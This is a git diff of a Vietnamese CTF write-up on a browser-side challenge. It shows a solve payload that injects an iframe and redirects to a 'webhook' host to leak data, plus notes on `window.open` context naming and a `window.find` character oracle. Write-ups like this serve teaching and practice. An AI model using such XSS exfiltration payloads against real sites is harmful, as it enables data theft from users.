@@ -108,6 +108,7 @@ Solve: `?html=<iframe name='x'></iframe>&p=location='http://webhook/?'+open('', 
 Khi gọi đến `window.open`, tham số thứ 2 sẽ được dùng để xác định tên của một context, nếu context đó chưa tồn tại thì sẽ thực hiện mở 1 window để mở ra context đó, vậy thì bằng cách chèn một iframe (đóng vai trò là một context) và đặt tên cho nó thì ta có thể select đến phần tử của context đó thông qua thuộc tính `frameElement` và từ đó truy xuất được đến các phần tử còn lại của DOM, cách làm rất sáng tạo. 
 ## Solution by Ske
 TL;DR:
+
 ![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/e42c14d5-0d7e-4bc6-b886-1ab3dd249ab2)
 
 Để ý hàm `containsText`, vì cách hàm này check là dùng `window.find` để loop qua các ký tự từ 0->65536, ta biết đây là giới hạn các ký tự có thể biểu diễn được của UTF-16 và mỗi ký tự sẽ cần 2 byte để biểu diễn
